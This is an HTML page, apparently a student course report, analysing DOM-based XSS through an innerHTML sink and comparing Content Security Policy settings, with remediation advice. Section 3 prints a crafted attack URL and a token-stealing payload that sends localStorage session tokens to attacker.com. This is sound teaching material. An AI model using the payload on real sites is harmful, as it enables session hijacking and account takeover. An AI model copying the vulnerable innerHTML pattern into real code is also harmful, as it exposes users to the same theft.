@@ -1,0 +1,816 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>AcademiaSecure — Security Analysis Report</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=IBM+Plex+Mono:wght@400;500&family=Lora:ital,wght@0,400;0,600;1,400&display=swap" rel="stylesheet">
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      
+      --bg: #07090f;
+      --surface: #0e1019;
+      --border: #1a1d2e;
+      --accent: #00f5c4;
+      --accent2: #ff4d6d;
+      --accent3: #7c6af7;
+      --warn: #ffb830;
+      --text: #dde0f0;
+      --muted: #5a5d72;
+      --font: 'Syne', sans-serif;
+      --mono: 'IBM Plex Mono', monospace;
+      --serif: 'Lora', serif;
+    }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: var(--font);
+    }
+
+    .report-nav {
+      background: var(--surface);
+      border-bottom: 1px solid var(--border);
+      padding: 16px 40px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      position: sticky;
+      top: 0; z-index: 50;
+    }
+
+    .report-nav .brand {
+      font-size: 16px;
+      font-weight: 800;
+      color: var(--accent);
+    }
+
+    .nav-links {
+      display: flex; gap: 8px;
+    }
+
+    .nav-links a {
+      font-family: var(--mono);
+      font-size: 11px;
+      color: var(--muted);
+      text-decoration: none;
+      padding: 5px 12px;
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      transition: all 0.15s;
+    }
+
+    .nav-links a:hover { color: var(--text); border-color: var(--text); }
+
+    /* Hero */
+    .hero {
+      padding: 80px 40px 60px;
+      max-width: 900px;
+      margin: 0 auto;
+      border-bottom: 1px solid var(--border);
+    }
+
+    .report-tag {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      background: rgba(255,77,109,0.1);
+      border: 1px solid rgba(255,77,109,0.25);
+      border-radius: 20px;
+      padding: 5px 14px;
+      font-family: var(--mono);
+      font-size: 11px;
+      color: var(--accent2);
+      letter-spacing: 1px;
+      text-transform: uppercase;
+      margin-bottom: 24px;
+    }
+
+    h1.report-title {
+      font-size: clamp(28px, 4vw, 44px);
+      font-weight: 800;
+      line-height: 1.15;
+      letter-spacing: -1px;
+      margin-bottom: 20px;
+    }
+
+    h1.report-title span { color: var(--accent); }
+
+    .report-subtitle {
+      font-family: var(--serif);
+      font-style: italic;
+      font-size: 18px;
+      color: var(--muted);
+      line-height: 1.7;
+      margin-bottom: 32px;
+      max-width: 680px;
+    }
+
+    .meta-row {
+      display: flex;
+      gap: 32px;
+      flex-wrap: wrap;
+    }
+
+    .meta-item {
+      font-family: var(--mono);
+      font-size: 11px;
+    }
+
+    .meta-item .mk { color: var(--muted); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 3px; }
+    .meta-item .mv { color: var(--text); font-weight: 500; }
+
+    /* Content area */
+    .report-body {
+      max-width: 900px;
+      margin: 0 auto;
+      padding: 60px 40px;
+    }
+
+    /* Table of Contents */
+    .toc {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 28px 32px;
+      margin-bottom: 60px;
+    }
+
+    .toc h2 {
+      font-size: 14px;
+      font-weight: 700;
+      color: var(--muted);
+      text-transform: uppercase;
+      letter-spacing: 2px;
+      font-family: var(--mono);
+      margin-bottom: 20px;
+    }
+
+    .toc-list {
+      list-style: none;
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+    }
+
+    .toc-list li {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .toc-list a {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      color: var(--muted);
+      text-decoration: none;
+      font-size: 14px;
+      transition: color 0.15s;
+    }
+
+    .toc-list a:hover { color: var(--accent); }
+
+    .toc-list .toc-num {
+      font-family: var(--mono);
+      font-size: 11px;
+      color: var(--border);
+      min-width: 24px;
+    }
+
+    /* Sections */
+    .section {
+      margin-bottom: 64px;
+    }
+
+    .section-number {
+      font-family: var(--mono);
+      font-size: 11px;
+      color: var(--muted);
+      text-transform: uppercase;
+      letter-spacing: 2px;
+      margin-bottom: 8px;
+    }
+
+    h2.section-title {
+      font-size: 26px;
+      font-weight: 800;
+      letter-spacing: -0.5px;
+      margin-bottom: 20px;
+      padding-bottom: 16px;
+      border-bottom: 1px solid var(--border);
+    }
+
+    h3.sub-title {
+      font-size: 17px;
+      font-weight: 700;
+      margin-bottom: 12px;
+      margin-top: 32px;
+      color: var(--text);
+    }
+
+    p.body-text {
+      font-family: var(--serif);
+      font-size: 16px;
+      line-height: 1.85;
+      color: #b8bdd0;
+      margin-bottom: 16px;
+    }
+
+    p.body-text code {
+      font-family: var(--mono);
+      font-size: 13px;
+      background: rgba(255,255,255,0.06);
+      padding: 2px 6px;
+      border-radius: 4px;
+      color: var(--warn);
+    }
+
+    /* Code blocks */
+    .code-block {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      overflow: hidden;
+      margin: 20px 0;
+    }
+
+    .code-block .cb-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 10px 16px;
+      border-bottom: 1px solid var(--border);
+      background: rgba(255,255,255,0.02);
+    }
+
+    .code-block .cb-lang {
+      font-family: var(--mono);
+      font-size: 10px;
+      color: var(--accent);
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+
+    .code-block .cb-label {
+      font-family: var(--mono);
+      font-size: 10px;
+      color: var(--muted);
+    }
+
+    .code-block pre {
+      font-family: var(--mono);
+      font-size: 13px;
+      line-height: 1.8;
+      padding: 18px 20px;
+      overflow-x: auto;
+      color: var(--muted);
+    }
+
+    .code-block pre .kw { color: var(--accent3); }
+    .code-block pre .str { color: var(--warn); }
+    .code-block pre .cm { color: #3d4060; }
+    .code-block pre .vuln { color: var(--accent2); font-weight: bold; }
+    .code-block pre .fix { color: var(--accent); }
+
+    /* Info boxes */
+    .info-box {
+      border-radius: 8px;
+      padding: 16px 20px;
+      margin: 20px 0;
+    }
+
+    .box-danger {
+      background: rgba(255,77,109,0.06);
+      border: 1px solid rgba(255,77,109,0.2);
+    }
+
+    .box-warn {
+      background: rgba(255,184,48,0.06);
+      border: 1px solid rgba(255,184,48,0.2);
+    }
+
+    .box-success {
+      background: rgba(0,245,196,0.05);
+      border: 1px solid rgba(0,245,196,0.15);
+    }
+
+    .info-box .ib-title {
+      font-family: var(--mono);
+      font-size: 11px;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      margin-bottom: 8px;
+    }
+
+    .box-danger .ib-title { color: var(--accent2); }
+    .box-warn .ib-title { color: var(--warn); }
+    .box-success .ib-title { color: var(--accent); }
+
+    .info-box p {
+      font-family: var(--mono);
+      font-size: 12px;
+      color: var(--muted);
+      line-height: 1.7;
+    }
+
+    /* Comparison table */
+    .compare-table {
+      width: 100%;
+      border-collapse: collapse;
+      margin: 20px 0;
+      font-size: 13px;
+    }
+
+    .compare-table th {
+      background: var(--surface);
+      padding: 12px 16px;
+      text-align: left;
+      font-family: var(--mono);
+      font-size: 11px;
+      color: var(--muted);
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      border-bottom: 2px solid var(--border);
+    }
+
+    .compare-table td {
+      padding: 12px 16px;
+      border-bottom: 1px solid var(--border);
+      vertical-align: top;
+      line-height: 1.5;
+    }
+
+    .compare-table tr:hover td { background: rgba(255,255,255,0.02); }
+
+    .check-yes { color: var(--accent); font-family: var(--mono); font-size: 12px; }
+    .check-no { color: var(--accent2); font-family: var(--mono); font-size: 12px; }
+    .check-partial { color: var(--warn); font-family: var(--mono); font-size: 12px; }
+
+    /* Threat model */
+    .threat-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 14px;
+      margin: 20px 0;
+    }
+
+    .threat-card {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 16px;
+    }
+
+    .threat-card .tc-label {
+      font-family: var(--mono);
+      font-size: 10px;
+      color: var(--muted);
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      margin-bottom: 6px;
+    }
+
+    .threat-card .tc-value {
+      font-size: 14px;
+      font-weight: 600;
+      margin-bottom: 8px;
+    }
+
+    .threat-card p { font-family: var(--mono); font-size: 12px; color: var(--muted); line-height: 1.6; }
+
+    /* Recommendations */
+    .rec-list {
+      display: flex;
+      flex-direction: column;
+      gap: 14px;
+      margin: 20px 0;
+    }
+
+    .rec-item {
+      display: flex;
+      gap: 16px;
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 16px;
+    }
+
+    .rec-item .ri-num {
+      width: 32px; height: 32px;
+      background: rgba(0,245,196,0.1);
+      border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      font-family: var(--mono);
+      font-size: 13px;
+      font-weight: 700;
+      color: var(--accent);
+      flex-shrink: 0;
+    }
+
+    .rec-item .ri-body {}
+    .rec-item .ri-title {
+      font-size: 14px;
+      font-weight: 700;
+      margin-bottom: 6px;
+    }
+
+    .rec-item p { font-family: var(--mono); font-size: 12px; color: var(--muted); line-height: 1.6; }
+
+    /* Footer */
+    .report-footer {
+      border-top: 1px solid var(--border);
+      padding: 40px;
+      text-align: center;
+    }
+
+    .report-footer p {
+      font-family: var(--mono);
+      font-size: 12px;
+      color: var(--muted);
+    }
+  </style>
+</head>
+<body>
+
+<nav class="report-nav">
+  <div class="brand">AcademiaSecure</div>
+  <div class="nav-links">
+    <a href="login.html">← Login</a>
+    <a href="dashboard.html">Dashboard</a>
+  </div>
+</nav>
+
+<div class="hero">
+  <div class="report-tag">🎓 Final Project Security Report</div>
+  <h1 class="report-title">Advanced Analysis of DOM-Based XSS &<br><span>CSP Misconfiguration</span></h1>
+  <p class="report-subtitle">A structured security case study demonstrating real-world session hijacking via client-side vulnerabilities, comparative CSP evaluation, and defense-in-depth recommendations.</p>
+  <div class="meta-row">
+    <div class="meta-item"><div class="mk">Course</div><div class="mv">Web Security — CS-481</div></div>
+    <div class="meta-item"><div class="mk">Type</div><div class="mv">Security Case Study</div></div>
+    <div class="meta-item"><div class="mk">Vulnerability</div><div class="mv">DOM-Based XSS (CWE-79)</div></div>
+    <div class="meta-item"><div class="mk">OWASP</div><div class="mv">A03:2021 Injection</div></div>
+  </div>
+</div>
+
+<div class="report-body">
+
+  <!-- TOC -->
+  <div class="toc">
+    <h2>Table of Contents</h2>
+    <ul class="toc-list">
+      <li><a href="#s1"><span class="toc-num">01</span> Executive Summary</a></li>
+      <li><a href="#s2"><span class="toc-num">02</span> Vulnerability Analysis — DOM-Based XSS</a></li>
+      <li><a href="#s3"><span class="toc-num">03</span> Exploitation Scenario & Impact</a></li>
+      <li><a href="#s4"><span class="toc-num">04</span> Content Security Policy — Comparative Evaluation</a></li>
+      <li><a href="#s5"><span class="toc-num">05</span> Threat Model</a></li>
+      <li><a href="#s6"><span class="toc-num">06</span> Recommendations & Remediation</a></li>
+      <li><a href="#s7"><span class="toc-num">07</span> Conclusion</a></li>
+    </ul>
+  </div>
+
+  <!-- S1 -->
+  <div class="section" id="s1">
+    <div class="section-number">Section 01</div>
+    <h2 class="section-title">Executive Summary</h2>
+    <p class="body-text">This project demonstrates a critical DOM-Based Cross-Site Scripting (XSS) vulnerability within a simulated academic web portal. The vulnerable application reads attacker-controlled input from a URL parameter (<code>?report=</code>) and injects it directly into the DOM using the dangerous <code>innerHTML</code> sink — without any sanitization or encoding.</p>
+    <p class="body-text">The exploitation scenario shows how a malicious actor can leverage this vulnerability to steal session tokens stored in <code>localStorage</code>, effectively performing session hijacking against authenticated users. The project then implements and evaluates multiple Content Security Policy (CSP) configurations, demonstrating that CSP serves as an important mitigation layer but cannot replace secure coding practices.</p>
+    <div class="info-box box-danger">
+      <div class="ib-title">⚠ Critical Finding</div>
+      <p>A DOM-based XSS vulnerability + tokens in localStorage = complete session compromise. No CSP configuration fully eliminates this risk when the root vulnerability remains unpatched.</p>
+    </div>
+  </div>
+
+  <!-- S2 -->
+  <div class="section" id="s2">
+    <div class="section-number">Section 02</div>
+    <h2 class="section-title">Vulnerability Analysis — DOM-Based XSS</h2>
+
+    <h3 class="sub-title">What is DOM-Based XSS?</h3>
+    <p class="body-text">DOM-Based XSS (also classified as Type-0 XSS) is a client-side vulnerability where the attack payload is executed as a result of modifying the DOM environment in the victim's browser. Unlike reflected or stored XSS, the malicious data never reaches the server — the vulnerability exists entirely in the client-side JavaScript.</p>
+    <p class="body-text">The OWASP classification places DOM XSS under CWE-79 (Improper Neutralization of Input During Web Page Generation). It is listed under OWASP Top 10 2021: A03 Injection.</p>
+
+    <h3 class="sub-title">Source & Sink Analysis</h3>
+    <p class="body-text">Every DOM XSS vulnerability involves a <strong>source</strong> (where attacker-controlled data enters) and a <strong>sink</strong> (where that data is unsafely consumed). In our application:</p>
+
+    <div class="code-block">
+      <div class="cb-header">
+        <span class="cb-lang">JavaScript</span>
+        <span class="cb-label">⚠ Vulnerable Pattern — dashboard.html</span>
+      </div>
+      <pre><span class="cm">// ── SOURCE: URL parameter (attacker-controlled) ─────────────</span>
+<span class="kw">const</span> params = <span class="kw">new</span> URLSearchParams(window.location.search);
+<span class="kw">const</span> report = params.get(<span class="str">'report'</span>);
+<span class="cm">// report = &lt;img src=x onerror="stealToken()"&gt;  ← attacker controls this</span>
+
+<span class="cm">// ── SINK: innerHTML — renders raw HTML/JS ────────────────────</span>
+document.getElementById(<span class="str">'renderZone'</span>).<span class="vuln">innerHTML</span> = report;
+<span class="cm">//                                          ^^^^^^^^^^^^^^^^^^^
+//                                          DANGEROUS SINK
+//                                          Executes embedded JS</span></pre>
+    </div>
+
+    <h3 class="sub-title">Why is innerHTML Dangerous?</h3>
+    <p class="body-text">The <code>innerHTML</code> property parses its argument as HTML, which means any embedded JavaScript — such as event handlers (<code>onerror</code>, <code>onload</code>) or <code>&lt;script&gt;</code> tags — is executed in the context of the page. This grants the attacker full access to the DOM, cookies, and browser storage.</p>
+
+    <p class="body-text">Safe alternatives include <code>textContent</code> (treats input as plain text, never parses HTML) or using a trusted sanitization library such as DOMPurify before passing to <code>innerHTML</code>.</p>
+
+    <div class="code-block">
+      <div class="cb-header">
+        <span class="cb-lang">JavaScript</span>
+        <span class="cb-label">✅ Secure Alternatives</span>
+      </div>
+      <pre><span class="cm">// Option 1: textContent (safest — no HTML parsing)</span>
+document.getElementById(<span class="str">'renderZone'</span>).<span class="fix">textContent</span> = report;
+
+<span class="cm">// Option 2: DOMPurify sanitization (allows safe HTML)</span>
+<span class="kw">const</span> clean = DOMPurify.sanitize(report);
+document.getElementById(<span class="str">'renderZone'</span>).innerHTML = clean;
+
+<span class="cm">// Option 3: Encode special characters before insertion</span>
+<span class="kw">const</span> encoded = report
+  .replace(<span class="str">/&/g, '&amp;'</span>)
+  .replace(<span class="str">/</span>&lt;<span class="str">/g, '&lt;'</span>)
+  .replace(<span class="str">/>/g, '&gt;'</span>);
+document.getElementById(<span class="str">'renderZone'</span>).innerHTML = encoded;</pre>
+    </div>
+  </div>
+
+  <!-- S3 -->
+  <div class="section" id="s3">
+    <div class="section-number">Section 03</div>
+    <h2 class="section-title">Exploitation Scenario & Impact</h2>
+
+    <h3 class="sub-title">Attack Flow</h3>
+    <p class="body-text">The exploitation chain consists of four steps: the attacker crafts a malicious URL, sends it to an authenticated victim, the victim's browser executes the payload, and the attacker receives the stolen session token.</p>
+
+    <div class="code-block">
+      <div class="cb-header">
+        <span class="cb-lang">Attack URL</span>
+        <span class="cb-label">Crafted Malicious Link</span>
+      </div>
+      <pre>https://portal.example.edu/dashboard.html?report=
+  <span class="vuln">&lt;img src=x onerror="
+    fetch('https://attacker.com/steal?t='+localStorage.getItem('auth_token'))
+  "&gt;</span></pre>
+    </div>
+
+    <h3 class="sub-title">Token Exfiltration Payload</h3>
+    <div class="code-block">
+      <div class="cb-header">
+        <span class="cb-lang">JavaScript Payload</span>
+        <span class="cb-label">Session Hijacking via localStorage</span>
+      </div>
+      <pre><span class="cm">// Executes in victim browser context when onerror fires:</span>
+<span class="kw">const</span> token = localStorage.getItem(<span class="str">'auth_token'</span>);
+<span class="kw">const</span> user  = localStorage.getItem(<span class="str">'auth_user'</span>);
+
+<span class="cm">// Exfiltrate to attacker's server</span>
+<span class="kw">new</span> Image().src = <span class="str">`https://attacker.com/steal
+  ?token=${encodeURIComponent(token)}
+  &amp;user=${encodeURIComponent(user)}`</span>;
+
+<span class="cm">// OR using fetch (if no CSP blocks it):</span>
+fetch(<span class="str">'https://attacker.com/steal'</span>, {
+  method: <span class="str">'POST'</span>,
+  body: JSON.stringify({ token, user })
+});</pre>
+    </div>
+
+    <h3 class="sub-title">Impact Assessment</h3>
+    <table class="compare-table">
+      <thead>
+        <tr>
+          <th>Impact Category</th>
+          <th>Severity</th>
+          <th>Description</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td>Session Hijacking</td>
+          <td><span class="check-no">CRITICAL</span></td>
+          <td>Attacker can impersonate the victim by reusing the stolen auth token</td>
+        </tr>
+        <tr>
+          <td>Data Exposure</td>
+          <td><span class="check-no">HIGH</span></td>
+          <td>All data visible on the dashboard can be read and exfiltrated</td>
+        </tr>
+        <tr>
+          <td>Account Takeover</td>
+          <td><span class="check-no">CRITICAL</span></td>
+          <td>Token theft allows full authenticated access without credentials</td>
+        </tr>
+        <tr>
+          <td>Phishing via DOM</td>
+          <td><span class="check-partial">MEDIUM</span></td>
+          <td>Attacker can inject fake UI elements (login forms) into the page</td>
+        </tr>
+        <tr>
+          <td>Keylogging</td>
+          <td><span class="check-partial">MEDIUM</span></td>
+          <td>Payload can attach event listeners to capture all keystrokes</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <!-- S4 -->
+  <div class="section" id="s4">
+    <div class="section-number">Section 04</div>
+    <h2 class="section-title">Content Security Policy — Comparative Evaluation</h2>
+
+    <p class="body-text">Content Security Policy is an HTTP response header (or meta tag) that instructs browsers to restrict which resources can be loaded and executed. It provides a secondary defense layer but — critically — cannot prevent DOM manipulation since it operates at the script-execution level, not at the DOM API level.</p>
+
+    <h3 class="sub-title">Configuration Comparison</h3>
+
+    <table class="compare-table">
+      <thead>
+        <tr>
+          <th>CSP Config</th>
+          <th>Inline Scripts</th>
+          <th>Event Handlers</th>
+          <th>External Scripts</th>
+          <th>HTML Injection</th>
+          <th>Token Theft</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td><strong>No CSP</strong></td>
+          <td><span class="check-no">✗ Allowed</span></td>
+          <td><span class="check-no">✗ Allowed</span></td>
+          <td><span class="check-no">✗ Allowed</span></td>
+          <td><span class="check-no">✗ Possible</span></td>
+          <td><span class="check-no">✗ Easy</span></td>
+        </tr>
+        <tr>
+          <td><strong>unsafe-inline</strong></td>
+          <td><span class="check-no">✗ Allowed</span></td>
+          <td><span class="check-no">✗ Allowed</span></td>
+          <td><span class="check-partial">~ Limited</span></td>
+          <td><span class="check-no">✗ Possible</span></td>
+          <td><span class="check-no">✗ Easy</span></td>
+        </tr>
+        <tr>
+          <td><strong>script-src 'self'</strong></td>
+          <td><span class="check-yes">✓ Blocked</span></td>
+          <td><span class="check-no">✗ Allowed*</span></td>
+          <td><span class="check-yes">✓ Blocked</span></td>
+          <td><span class="check-no">✗ Possible</span></td>
+          <td><span class="check-partial">~ Harder</span></td>
+        </tr>
+        <tr>
+          <td><strong>Strict nonce-based</strong></td>
+          <td><span class="check-yes">✓ Blocked</span></td>
+          <td><span class="check-yes">✓ Blocked</span></td>
+          <td><span class="check-yes">✓ Blocked</span></td>
+          <td><span class="check-no">✗ Still Possible</span></td>
+          <td><span class="check-partial">~ Mitigated</span></td>
+        </tr>
+      </tbody>
+    </table>
+    <p style="font-family:var(--mono);font-size:11px;color:var(--muted);margin-top:-12px;margin-bottom:20px">* Event handlers via innerHTML may still fire in some browser CSP implementations.</p>
+
+    <h3 class="sub-title">Why CSP Cannot Fix DOM XSS</h3>
+    <p class="body-text">CSP operates at the browser's script loading and execution layer. However, DOM XSS exploits the fact that JavaScript is already executing on the page — it uses the victim page's own JS context to interact with the DOM. When the attacker's payload executes inside an event handler injected via <code>innerHTML</code>, it runs as part of the legitimate page's script — not as a separately loaded script that CSP could block.</p>
+
+    <div class="info-box box-warn">
+      <div class="ib-title">⚠ False Sense of Security</div>
+      <p>Organizations that deploy weak CSP headers (e.g., including <code>unsafe-inline</code>) often believe they are protected against XSS. This creates a dangerous false sense of security. Weak CSP provides essentially no protection against DOM-based XSS with event handler payloads.</p>
+    </div>
+
+    <div class="code-block">
+      <div class="cb-header">
+        <span class="cb-lang">HTTP Header</span>
+        <span class="cb-label">Recommended Strict CSP Configuration</span>
+      </div>
+      <pre><span class="cm"># Server-side HTTP header (recommended)</span>
+Content-Security-Policy:
+  default-src <span class="str">'self'</span>;
+  script-src <span class="str">'self'</span> <span class="fix">'nonce-{RANDOM_PER_REQUEST}'</span>;
+  style-src <span class="str">'self'</span> <span class="str">'nonce-{RANDOM_PER_REQUEST}'</span>;
+  img-src <span class="str">'self'</span> data:;
+  connect-src <span class="str">'self'</span>;
+  object-src <span class="str">'none'</span>;
+  base-uri <span class="str">'self'</span>;
+  form-action <span class="str">'self'</span>;
+  frame-ancestors <span class="str">'none'</span>;
+
+<span class="cm"># ⚠ NEVER use:</span>
+script-src <span class="vuln">'unsafe-inline'</span>    <span class="cm">← negates all CSP protection</span>
+script-src <span class="vuln">'unsafe-eval'</span>       <span class="cm">← allows eval(), setTimeout(string)</span></pre>
+    </div>
+  </div>
+
+  <!-- S5 -->
+  <div class="section" id="s5">
+    <div class="section-number">Section 05</div>
+    <h2 class="section-title">Threat Model</h2>
+
+    <p class="body-text">Using the STRIDE threat modeling framework, we identify the following threats applicable to this system:</p>
+
+    <div class="threat-grid">
+      <div class="threat-card">
+        <div class="tc-label">Spoofing</div>
+        <div class="tc-value" style="color:var(--accent2)">Session Impersonation</div>
+        <p>Attacker uses stolen auth_token to authenticate as victim without knowing their password.</p>
+      </div>
+      <div class="threat-card">
+        <div class="tc-label">Tampering</div>
+        <div class="tc-value" style="color:var(--warn)">DOM Manipulation</div>
+        <p>Injected HTML modifies page content — grades, messages, or UI elements can be altered in the victim's view.</p>
+      </div>
+      <div class="threat-card">
+        <div class="tc-label">Information Disclosure</div>
+        <div class="tc-value" style="color:var(--accent2)">Token & Data Theft</div>
+        <p>localStorage contents including auth tokens, user IDs, and sensitive academic data are exposed to attacker scripts.</p>
+      </div>
+      <div class="threat-card">
+        <div class="tc-label">Elevation of Privilege</div>
+        <div class="tc-value" style="color:var(--warn)">Authenticated Access</div>
+        <p>An unauthenticated attacker gains authenticated session access by sending the crafted URL to a logged-in user.</p>
+      </div>
+    </div>
+
+    <h3 class="sub-title">Attack Vectors</h3>
+    <p class="body-text">The most realistic delivery vector is via phishing: the attacker sends the malicious URL to a student via email, SMS, or a compromised forum. Social engineering (e.g., "view your updated grades here") makes the click highly likely. The URL appears to point to the legitimate portal, reducing victim suspicion.</p>
+  </div>
+
+  <!-- S6 -->
+  <div class="section" id="s6">
+    <div class="section-number">Section 06</div>
+    <h2 class="section-title">Recommendations & Remediation</h2>
+
+    <div class="rec-list">
+      <div class="rec-item">
+        <div class="ri-num">01</div>
+        <div class="ri-body">
+          <div class="ri-title">Fix the Root Cause: Eliminate innerHTML with User Input</div>
+          <p>Replace all <code>innerHTML</code> assignments that use URL parameters, form data, or any user-controlled sources with <code>textContent</code>. If rich HTML rendering is required, use DOMPurify.sanitize() before assignment. This is the ONLY real fix — CSP alone is insufficient.</p>
+        </div>
+      </div>
+      <div class="rec-item">
+        <div class="ri-num">02</div>
+        <div class="ri-body">
+          <div class="ri-title">Migrate Session Tokens from localStorage to HttpOnly Cookies</div>
+          <p>Tokens stored in <code>localStorage</code> are accessible to any JavaScript on the page. Using <code>HttpOnly; Secure; SameSite=Strict</code> cookies makes them invisible to JavaScript entirely, preventing token theft even if XSS occurs.</p>
+        </div>
+      </div>
+      <div class="rec-item">
+        <div class="ri-num">03</div>
+        <div class="ri-body">
+          <div class="ri-title">Deploy a Strict Nonce-Based Content Security Policy</div>
+          <p>Generate a cryptographically random nonce per request server-side and include it in the CSP header and all legitimate <code>&lt;script&gt;</code> tags. This blocks all injected scripts from executing. Never use <code>unsafe-inline</code> or <code>unsafe-eval</code>.</p>
+        </div>
+      </div>
+      <div class="rec-item">
+        <div class="ri-num">04</div>
+        <div class="ri-body">
+          <div class="ri-title">Implement Trusted Types API</div>
+          <p>The Trusted Types browser API prevents dangerous DOM sinks (<code>innerHTML</code>, <code>document.write</code>) from accepting raw strings. All assignments must go through a declared policy that sanitizes the data. This enforces secure-by-default DOM manipulation across the entire codebase.</p>
+        </div>
+      </div>
+      <div class="rec-item">
+        <div class="ri-num">05</div>
+        <div class="ri-body">
+          <div class="ri-title">Input Validation & Output Encoding</div>
+          <p>Validate all URL parameters on arrival and apply context-sensitive output encoding. For HTML context, encode <code>&lt; &gt; " ' &amp;</code>. Use a security-aware framework or template engine that auto-escapes by default (e.g., React, Angular — both use safe rendering by default).</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- S7 -->
+  <div class="section" id="s7">
+    <div class="section-number">Section 07</div>
+    <h2 class="section-title">Conclusion</h2>
+    <p class="body-text">This project has demonstrated, through a realistic simulated environment, that DOM-Based XSS remains a critical and underestimated threat in modern web applications. The vulnerability — a single unguarded <code>innerHTML</code> assignment — creates a direct path to complete session compromise.</p>
+    <p class="body-text">The comparative analysis of CSP configurations reveals a key insight for security practitioners: CSP is a valuable defense-in-depth mechanism, but it is not — and was never designed to be — a substitute for fixing the underlying vulnerability. Misconfigured CSP (particularly any use of <code>unsafe-inline</code>) provides a false sense of security that can be more dangerous than no CSP at all.</p>
+    <p class="body-text">The correct approach is layered: eliminate dangerous sinks at the code level, store sensitive tokens in HttpOnly cookies, deploy strict nonce-based CSP, and implement Trusted Types to enforce secure DOM patterns across the codebase.</p>
+
+    <div class="info-box box-success">
+      <div class="ib-title">✓ Key Takeaways</div>
+      <p>
+        1. DOM-XSS must be fixed at the source — never rely solely on CSP.<br>
+        2. Tokens in localStorage are always accessible to injected scripts.<br>
+        3. Weak CSP (unsafe-inline) provides essentially zero XSS protection.<br>
+        4. Defense-in-depth requires: secure coding + CSP + HttpOnly cookies + Trusted Types.<br>
+        5. The attack surface is the link between a user's session and attacker-controlled input.
+      </p>
+    </div>
+  </div>
+
+</div><!-- /report-body -->
+
+<div class="report-footer">
+  <p>AcademiaSecure — Web Security Final Project · DOM-XSS & CSP Analysis</p>
+  <p style="margin-top:6px;color:#2a2d3e">For educational purposes only. All vulnerabilities are intentional demonstrations.</p>
+</div>
+
+</body>
+</html>
